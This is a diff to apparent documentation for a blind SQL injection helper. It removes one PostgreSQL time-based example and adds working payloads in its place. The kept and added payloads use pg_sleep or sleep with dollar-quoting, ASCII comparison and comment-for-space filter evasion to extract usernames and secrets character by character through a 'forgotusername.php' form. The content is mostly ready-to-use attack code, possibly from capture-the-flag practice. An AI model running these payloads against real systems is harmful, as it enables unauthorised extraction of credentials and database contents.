@@ -14,25 +14,7 @@ extract_string_blind() and it pulls the whole string for you. Everything
 target-specific (session, URL, the SQLi payload) goes inside that one function.
 
 Example - time-based blind SQLi on PostgreSQL:
-
-    def is_correct_char(index: int, char: str) -> bool:
-        # Asks the DB: "is character <index> of the secret == <char>?
-        # If yes, sleep 3s." A slow response then means the guess was right.
-        # $$...$$ is Postgres dollar-quoting - it drops <char> in safely even
-        # when <char> is a quote or other special character.
-        payload = (
-            "1 AND (SELECT CASE WHEN "
-            f"substr((SELECT secret FROM users LIMIT 1), {index}, 1) = $${char}$$ "
-            "THEN pg_sleep(3) ELSE pg_sleep(0) END)"
-        )
-        start = time.time()
-        session.get(TARGET + "/search", params={"id": payload})
-        return time.time() - start >= 3   # delayed response => correct char
-
-    secret = extract_string_blind(is_correct_char, length=32, label="admin token")
-    print(secret)
-
-    OR FOR POSTGRES SQLi..
+    # POSTGRES SQLi, using $$ --> bypasses quotes
     def stage1_sqli(base_url: str) -> None:
         def is_correct_char_username(index: int, char: str) -> bool:
             payload = f\"\"\"admin'; SELECT CASE WHEN (substr((SELECT username FROM users LIMIT 1 OFFSET 0), {index}, 1) = $${char}$$) THEN pg_sleep(3) ELSE pg_sleep(0) END; --\"\"\"
@@ -40,9 +22,17 @@ Example - time-based blind SQLi on PostgreSQL:
             session.post(f"{base_url}/forgotusername.php", data={"username": payload})
             return time.time() - start >= 3
         secret = extract_string_blind(is_correct_char_username, length=32, label="username")
+
+    # POSTGRES SQLi, comparing using the ascii value of the char --> bypasses quotes, $$
+    def is_correct_char_username(index: int, char: str) -> bool:
+        ascii_val = ord(char)
+        payload = f\"\"\"admin'; SELECT CASE WHEN (ascii(substr((SELECT username FROM users LIMIT 1 OFFSET 0), {index}, 1)) = {ascii_val}) THEN pg_sleep(3) ELSE pg_sleep(0) END; --\"\"\"
+        start = time.time()
+        session.post(f"{base_url}/forgotusername.php", data={"username": payload})
+        return time.time() - start >= 3
     
     OR FOR MYSQLi:
-        def is_correct_char_username(index: int, char: str) -> bool:
+    def is_correct_char_username(index: int, char: str) -> bool:
         payload = f\"\"\"7 OR (SELECT CASE WHEN (BINARY SUBSTR((SELECT username FROM users LIMIT 1 OFFSET 0), {index}, 1) = '{char}') THEN sleep(1) ELSE sleep(0) END);\"\"\"
         final_payload = payload.replace(" ", "/**/")
         start = time.time()
